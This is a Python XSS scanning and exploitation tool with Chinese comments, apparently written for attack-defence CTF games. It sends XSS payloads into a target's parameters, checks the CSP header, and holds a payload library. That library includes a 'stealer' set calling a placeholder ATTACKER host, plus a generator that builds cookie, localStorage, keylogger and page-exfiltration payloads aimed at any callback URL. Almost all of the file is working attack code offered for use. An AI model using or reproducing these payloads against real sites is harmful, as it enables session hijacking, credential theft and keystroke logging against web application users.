#!/usr/bin/env python3
"""
AWD XSS 扫描与利用工具
支持: 反射型 XSS, 存储型 XSS, DOM 型 XSS, CSP 绕过, XSS 钓鱼
"""

import requests
import re
import sys
import json
import time
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse, quote


class XSSScanner:
    def __init__(self, url, method='GET', data=None, headers=None, cookies=None, timeout=10):
        self.url = url
        self.method = method.upper()
        self.data = data or {}
        self.headers = headers or {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}
        self.cookies = cookies or {}
        self.timeout = timeout
        self.session = requests.Session()
        self.session.headers.update(self.headers)
        if self.cookies:
            for k, v in self.cookies.items():
                self.session.cookies.set(k, v)
        self.results = []
        self.xss_payloads_found = []

    def _send(self, url, data=None):
        try:
            if self.method == 'GET':
                return self.session.get(url, timeout=self.timeout, allow_redirects=True)
            else:
                return self.session.post(url, data=data, timeout=self.timeout, allow_redirects=True)
        except Exception:
            return None

    def _build_url(self, param_name, value):
        parsed = urlparse(self.url)
        params = parse_qs(parsed.query)
        params[param_name] = [value]
        new_query = urlencode(params, doseq=True)
        return urlunparse(parsed._replace(query=new_query))

    def _build_data(self, param_name, value):
        data = dict(self.data)
        data[param_name] = value
        return data

    def _get_params(self):
        parsed = urlparse(self.url)
        get_params = list(parse_qs(parsed.query).keys())
        post_params = list(self.data.keys())
        return get_params + post_params

    # ========= XSS Payload 库 =========
    def _get_xss_payloads(self):
        """返回分类 XSS Payload 列表"""
        return {
            'basic': [
                '<script>alert("AWD_XSS")</script>',
                '<script>alert(document.cookie)</script>',
                '<img src=x onerror=alert("AWD_XSS")>',
                '<img src=x onerror=alert(document.cookie)>',
                '<svg onload=alert("AWD_XSS")>',
                '<body onload=alert("AWD_XSS")>',
                '<input onfocus=alert("AWD_XSS") autofocus>',
                '<iframe src="javascript:alert(\'AWD_XSS\')">',
                '<a href="javascript:alert(\'AWD_XSS\')">Click</a>',
                '<img src="javascript:alert(\'AWD_XSS\')">',
            ],
            'attribute_bypass': [
                '" onmouseover="alert(\'AWD_XSS\')',
                '" onclick="alert(\'AWD_XSS\')',
                '" onfocus="alert(\'AWD_XSS\') autofocus="',
                '" oninput="alert(\'AWD_XSS\')',
                '" onload="alert(\'AWD_XSS\')',
                '"><script>alert("AWD_XSS")</script>',
                '" autofocus onfocus="alert(\'AWD_XSS\')',
                '<img src=x onerror="alert(\'AWD_XSS\')">',
                '<svg/onload=alert("AWD_XSS")>',
                '"><img src=x onerror="alert(\'AWD_XSS\')">',
            ],
            'html_context': [
                '<div onmouseover="alert(\'AWD_XSS\')">test</div>',
                '<script>alert("AWD_XSS")</script>',
                '"><script>alert("AWD_XSS")</script>',
                '</div><script>alert("AWD_XSS")</script>',
                '<img src=x onerror=alert("AWD_XSS")>',
                '<svg onload=alert("AWD_XSS")>',
                '<details open ontoggle=alert("AWD_XSS")>',
                '<video src=x onerror=alert("AWD_XSS")>',
                '<audio src=x onerror=alert("AWD_XSS")>',
                '<body onload=alert("AWD_XSS")>',
            ],
            'js_context': [
                '";alert("AWD_XSS");//',
                "';alert('AWD_XSS');//",
                '"+alert("AWD_XSS")+"',
                "'+alert('AWD_XSS')+'",
                '</script><script>alert("AWD_XSS")</script>',
                '<ScRiPt>alert("AWD_XSS")</ScRiPt>',
                '<img src=x onerror=alert("AWD_XSS")>',
            ],
            'filtered': [
                '<ScRiPt>alert("AWD_XSS")</ScRiPt>',
                '<SCRIPT>alert("AWD_XSS")</SCRIPT>',
                '<script>alert(String.fromCharCode(65,87,68,95,88,83,83))</script>',
                '<img src=x onerror="alert(\"AWD_XSS\")">',
                '<img src=x OneErRoR="alert(\"AWD_XSS\")">',
                '<svg OnLoad="alert(\"AWD_XSS\")">',
                '"><img src=x onerror="alert(1)">',
                '<details open ontoggle="alert(1)">',
                '\\\\x3Cscript>alert("AWD_XSS")\\\\x3C/script>',
                '<img src=x onerror="alert(1)">',
                '<IFRAME SRC="javascript:alert(1)">',
            ],
            'csp_bypass': [
                # CSP 绕过 - JSONP
                '<script src="https://raw.githubusercontent.com/foobar/xss/main/xss.js"></script>',
                # 利用允许的域
                '<script src="//code.jquery.com/jquery-1.11.3.min.js"></script>',
                # 非脚本标签
                '<img src=x onerror="alert(1)">',
                '<svg onload="alert(1)">',
                '<body onload="alert(1)">',
                # DOM Clobbering
                '<form id=alert><input id=toString value="alert(1)">',
            ],
            'stealer': [
                # Cookie 窃取
                '<script>new Image().src="http://ATTACKER/steal?c="+document.cookie</script>',
                '<script>fetch("http://ATTACKER/steal",{method:"POST",body:document.cookie})</script>',
                # 凭证窃取
                '<script>var f=document.createElement("form");f.action="http://ATTACKER/steal";document.body.appendChild(f);f.submit()</script>',
                # WebShell 交互
                '<script>var x=new XMLHttpRequest();x.open("GET","http://ATTACKER/c2?d="+document.cookie);x.send()</script>',
                # 键盘记录
                '<script>document.onkeypress=function(e){new Image().src="http://ATTACKER/keylog?k="+e.key}</script>',
            ],
        }

    # ========= 1. 反射型 XSS 检测 =========
    def detect_reflected_xss(self):
        """检测反射型 XSS"""
        print("\n[*] 检测反射型 XSS")
        payloads = self._get_xss_payloads()

        params = self._get_params()
        basic_payload = '<script>alert("XSS_TEST")</script>'

        for param in params:
            # 使用简单唯一标识
            test_marker = "XSS_UNIQUE_MARKER_12345"
            test_value = f"<script>alert('{test_marker}')</script>"

            if self.method == 'GET':
                test_url = self._build_url(param, test_value)
                resp = self._send(test_url)
            else:
                test_data = self._build_data(param, test_value)
                resp = self._send(self.url, test_data)

            if resp is None:
                continue

            # 检查 payload 是否原样出现在响应中
            if test_marker in resp.text:
                print(f"  [!!!] 反射型 XSS 确认: 参数={param}")
                self.results.append({
                    'type': 'reflected_xss',
                    'param': param,
                    'severity': 'high',
                    'payload': test_value
                })

                # 继续测试各类 Payload
                for category, payload_list in payloads.items():
                    for payload in payload_list:
                        payload_marker = f"XSS_MARKER_{category}"
                        full_payload = payload.replace("AWD_XSS", payload_marker).replace("1", payload_marker)

                        if self.method == 'GET':
                            test_url = self._build_url(param, full_payload)
                            resp2 = self._send(test_url)
                        else:
                            test_data = self._build_data(param, full_payload)
                            resp2 = self._send(self.url, test_data)

                        if resp2 and payload_marker in resp2.text:
                            print(f"  [+] {category} Payload 可执行: {full_payload[:50]}")
                            self.xss_payloads_found.append({
                                'param': param,
                                'category': category,
                                'payload': full_payload,
                                'response_contains': payload_marker
                            })

                return True

        print("  [-] 未发现反射型 XSS")
        return False

    # ========= 2. DOM 型 XSS 检测 =========
    def detect_dom_xss(self):
        """检测 DOM 型 XSS (基于 source sink 分析)"""
        print("\n[*] 检测 DOM 型 XSS")

        dom_sources = [
            'location.search', 'location.hash', 'location.href',
            'document.URL', 'document.location', 'document.referrer',
            'document.cookie', 'window.name',
        ]

        dom_sinks = [
            'innerHTML', 'outerHTML', 'document.write', 'eval',
            'setTimeout', 'setInterval', 'Function',
            'location.href', 'location.assign', 'location.replace',
            'document.cookie', 'window.open',
        ]

        for param in self._get_params():
            for source in dom_sources:
                payloads = [
                    f'<script>document.getElementById("test").innerHTML="{source}"</script>',
                    f'<script>eval("{source}")</script>',
                    f'<img src=x onerror="eval({source})">',
                    f'<svg onload="eval({source})">',
                ]

                for payload in payloads:
                    if self.method == 'GET':
                        test_url = self._build_url(param, payload)
                        resp = self._send(test_url)
                    else:
                        test_data = self._build_data(param, payload)
                        resp = self._send(self.url, test_data)

                    if resp is None:
                        continue

                    # 检查是否包含 DOM XSS sink
                    for sink in dom_sinks:
                        if sink in resp.text.lower() and source.replace('location.', 'location.') in resp.text.lower():
                            print(f"  [!!!] DOM XSS 可能: {param} -> {source} -> {sink}")
                            self.results.append({
                                'type': 'dom_xss',
                                'param': param,
                                'source': source,
                                'sink': sink,
                                'severity': 'high'
                            })

        print("  [-] DOM XSS 扫描完成")
        return len([r for r in self.results if r.get('type') == 'dom_xss']) > 0

    # ========= 3. CSP 检测 =========
    def detect_csp(self):
        """检测内容安全策略 (CSP)"""
        print("\n[*] 检测 CSP 策略")

        try:
            resp = self.session.get(self.url, timeout=self.timeout)
        except Exception:
            return None

        csp_header = resp.headers.get('Content-Security-Policy', '') or resp.headers.get('Content-Security-Policy-Report-Only', '')

        if csp_header:
            print(f"  [*] 发现 CSP: {csp_header[:200]}")

            csp_analysis = {
                'header': csp_header,
                'unsafe_inline': 'unsafe-inline' in csp_header,
                'unsafe_eval': 'unsafe-eval' in csp_header,
                'wildcard': '*' in csp_header,
                'self': "'self'" in csp_header,
                'has_script_src': 'script-src' in csp_header,
                'has_default_src': 'default-src' in csp_header,
                'bypassable': False,
            }

            # 分析是否可绕过
            if csp_analysis['unsafe_inline']:
                csp_analysis['bypassable'] = True
                print("  [!] CSP 包含 'unsafe-inline', 可直接执行内联脚本!")
            if csp_analysis['unsafe_eval']:
                csp_analysis['bypassable'] = True
                print("  [!] CSP 包含 'unsafe-eval', eval 可用!")
            if csp_analysis['wildcard']:
                csp_analysis['bypassable'] = True
                print("  [!] CSP 包含通配符 '*', 规则过于宽松!")

            self.results.append({'type': 'csp_analysis', 'analysis': csp_analysis})
            return csp_analysis
        else:
            print("  [+] 未发现 CSP 策略, XSS 攻击无防护")
            self.results.append({'type': 'csp_analysis', 'analysis': {'no_csp': True, 'bypassable': True}})
            return {'no_csp': True, 'bypassable': True}

    # ========= 4. Cookie 窃取 Payload 生成 =========
    def generate_stealer_payload(self, callback_url):
        """生成 Cookie 窃取 Payload"""
        print(f"\n[*] 生成 Cookie 窃取 Payload (回调: {callback_url})")

        payloads = [
            # 简单 Image 请求
            f'<script>new Image().src="{callback_url}?c="+document.cookie</script>',
            # POST 请求 (更隐蔽)
            f'<script>fetch("{callback_url}",{{method:"POST",body:document.cookie}})</script>',
            # XHR 请求
            f'<script>var x=new XMLHttpRequest();x.open("POST","{callback_url}");x.send(document.cookie)</script>',
            # 绕过长度限制
            f'<img src="{callback_url}?c="+escape(document.cookie)>',
            # 分步窃取
            f'<script>var c=document.cookie;var i=new Image();i.src="{callback_url}/1?c="+c.substring(0,50);var i2=new Image();i2.src="{callback_url}/2?c="+c.substring(50)</script>',
            # 窃取 localStorage
            f'<script>var d=JSON.stringify(localStorage);new Image().src="{callback_url}?l="+escape(d)</script>',
            # 同源读取敏感接口
            f'<script>fetch("/api/userinfo").then(r=>r.text()).then(t=>new Image().src="{callback_url}?d="+btoa(t))</script>',
            # 键盘记录
            f'<script>document.onkeypress=function(e){{new Image().src="{callback_url}/k?k="+e.key}}</script>',
            # 完整会话劫持
            f'<script>var x=new XMLHttpRequest();x.open("GET","/");x.onload=function(){{new Image().src="{callback_url}/h?d="+btoa(x.responseText)}};x.send()</script>',
        ]

        for i, payload in enumerate(payloads, 1):
            print(f"  [{i}] {payload[:80]}...")

        return payloads

    # ========= 完整扫描流程 =========
    def full_scan(self, callback_url=None):
        """执行完整 XSS 扫描"""
        print("="*60)
        print("  AWD XSS 扫描与利用工具")
        print("="*60)
        print(f"目标: {self.url}")

        self.detect_csp()
        self.detect_reflected_xss()
        self.detect_dom_xss()

        if callback_url:
            self.generate_stealer_payload(callback_url)

        # 结果汇总
        print("\n" + "="*60)
        print("  XSS 扫描结果")
        print("="*60)

        xss_findings = [r for r in self.results if r.get('severity')]
        if xss_findings:
            for r in xss_findings:
                print(f"  [严重] {r.get('type')} - {r.get('param', '')}")
        else:
            print("  未发现反射型或 DOM 型 XSS")

        if self.xss_payloads_found:
            print(f"\n  可用 Payload ({len(self.xss_payloads_found)} 个):")
            for pf in self.xss_payloads_found[:10]:
                print(f"    [{pf['category']}] {pf['payload'][:60]}")

        return self.results


if __name__ == '__main__':
    if len(sys.argv) < 2:
        print("用法:")
        print("  python3 xss_scanner.py <url>")
        print("  python3 xss_scanner.py <url> --post 'param1=val1'")
        print("  python3 xss_scanner.py <url> --callback <回调URL>")
        print("  python3 xss_scanner.py <url> --cookie 'session=xxx'")
        sys.exit(1)

    url = sys.argv[1]
    method = 'GET'
    data = {}
    cookies = {}
    callback_url = None

    i = 2
    while i < len(sys.argv):
        if sys.argv[i] == '--post' and i + 1 < len(sys.argv):
            method = 'POST'
            for pair in sys.argv[i+1].split('&'):
                if '=' in pair:
                    k, v = pair.split('=', 1)
                    data[k] = v
            i += 2
        elif sys.argv[i] == '--cookie' and i + 1 < len(sys.argv):
            for pair in sys.argv[i+1].split(';'):
                pair = pair.strip()
                if '=' in pair:
                    k, v = pair.split('=', 1)
                    cookies[k.strip()] = v.strip()
            i += 2
        elif sys.argv[i] == '--callback' and i + 1 < len(sys.argv):
            callback_url = sys.argv[i+1]
            i += 2
        else:
            i += 1

    scanner = XSSScanner(url, method=method, data=data, cookies=cookies)
    scanner.full_scan(callback_url=callback_url)
